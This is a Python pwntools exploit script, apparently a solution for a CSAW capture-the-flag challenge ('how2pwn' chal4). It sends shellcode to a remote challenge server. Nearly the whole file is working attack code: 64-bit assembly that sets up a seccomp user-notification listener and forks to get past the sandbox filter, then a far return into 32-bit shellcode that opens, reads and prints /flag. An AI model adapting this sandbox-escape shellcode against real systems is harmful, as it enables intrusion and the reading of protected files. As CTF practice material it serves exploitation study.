#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

elf = ELF('./chal4')

context.binary = elf

ENCODING = 'ISO-8859-1'
s = lambda senddata : p.send(senddata.encode(ENCODING))
sa = lambda recvdata, senddata : p.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
sl = lambda senddata : p.sendline(senddata.encode(ENCODING))
sla = lambda recvdata, senddata : p.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
r = lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f : p.recv(numb, timeout=timeout).decode(ENCODING)
ru = lambda recvdata, timeout=0x3f3f3f3f : p.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING)
uu32 = lambda data : u32(data.encode(ENCODING), signed='unsigned')
uu64 = lambda data : u64(data.encode(ENCODING), signed='unsigned')
iu32 = lambda data : u32(data.encode(ENCODING), signed='signed')
iu64 = lambda data : u64(data.encode(ENCODING), signed='signed')
up32 = lambda data : p32(data, signed='unsigned').decode(ENCODING)
up64 = lambda data : p64(data, signed='unsigned').decode(ENCODING)
ip32 = lambda data : p32(data, signed='signed').decode(ENCODING)
ip64 = lambda data : p64(data, signed='signed').decode(ENCODING)

local = 0
if local:
    p = process([elf.path])
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('how2pwn.chal.csaw.io', 60004)
    libc = ELF('./libc.so.6')

ticket = '7a01505a0cfefc2f8249cb24e01a2890'

#gdb.attach(p, 'set follow-fork-mode child')

s(ticket)

context.arch = 'amd64'

mem = 0xcafe000

retf = b'\xcb'

# https://github.com/google/google-ctf/blob/master/2022/sandbox-s2/exploit/exploit.cc
sh = (
f'''
    mov esp, {mem+0x800}
    mov rsi, 0x8
    mov rbx, 0x7fff000000000006
    push rbx
    mov rbx, 0x7fc0000000000006
    push rbx
    mov rbx, 0xc000003e00010015
    push rbx
    mov rbx, 0x400000020
    push rbx
    mov rbx, rsp
    push rbx
    xor rbx, rbx
    mov bl, 0x4
    push rbx
    mov rdx, rsp
    mov rax, 0x13d
    mov rdi, 0x1
    syscall
''' + # install_notify => syscall(__NR_seccomp, SECCOMP_SET_MODE_FILTER, SECCOMP_FILTER_FLAG_NEW_LISTENER, &exo_prog)
f'''
    mov r8, rax
    mov rax, 0x39
    syscall
    cmp rax, 0
    je child_process
''' + # fork()
f'''
parent_process:
    xor rax, rax
clean_req_and_resp:
    mov ecx, 0xd
    mov rdx, {mem+0xc00}
loop:
    mov qword ptr [rdx], rax
    dec rcx
    add dl, 0x8
    cmp rcx, 0
    jne loop
''' + # handle_notify => memset(req, 0, sizeof(req)) & memset(resp, 0, siezof(resp))
f'''
recv:
    mov rax, 0x10
    mov rdi, r8
    mov rsi, 0xc0502100
    mov rdx, {mem+0xc00}
    syscall
''' + # handle_notify => ioctl(fd, SECCOMP_IOCTL_NOTIF_RECV, &req)
f'''
copy_id_of_resp:
    mov rax, {mem+0xc00}
    mov rbx, qword ptr [rax]
    add al, 0x50
    mov qword ptr [rax], rbx
''' + # handle_notify => resp.id = req.id
f'''
set_flags_of_resp:
    add al, 0x14
    mov rbx, 0x1
    mov dword ptr [rax], ebx
''' + # handle_notify => resp.flags = SECCOMP_USER_NOTIF_FLAG_CONTINUE
f'''
resp:
    xor rax, rax
    mov al, 0x10
    mov rdi, r8
    mov esi, 0xc0182101
    mov edx, {mem+0xc50}
    syscall
    jmp parent_process
''' + # handle_notify => ioctl(fd, SECCOMP_IOCTL_NOTIF_SEND, &resp)
f'''
child_process:
    mov rcx, 0x10000
wait_loop:
    dec rcx
    cmp rcx, 0
    jne wait_loop
''' + # waiting for parent process
f'''
show_flag:
    mov rax, 0x230cafe180
    push rax
'''
)

payload = asm(sh) + retf

context.arch = 'i386'
context.bits = '32'

x32_showflag_sh = (
'''
    mov esp, 0xcafe200
    mov eax, 0x5
    push 0x67
    push 0x616c662f
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    int 0x80
''' + # SYSCALL_open
'''
    mov ebx, eax
    mov al, 0x3
    mov ecx, 0xcafea00
    mov edx, 0x100
    int 0x80
''' + # SYSCALL_read
'''
    xor eax, eax
    mov al, 0x4
    xor ebx, ebx
    mov bl, 0x1
    int 0x80
''' # SYSCALL_write
)

payload = payload.ljust(0x180, b'\x00') + asm(x32_showflag_sh)

p.sendlineafter(b'Enter your shellcode: \n', payload)

p.interactive()

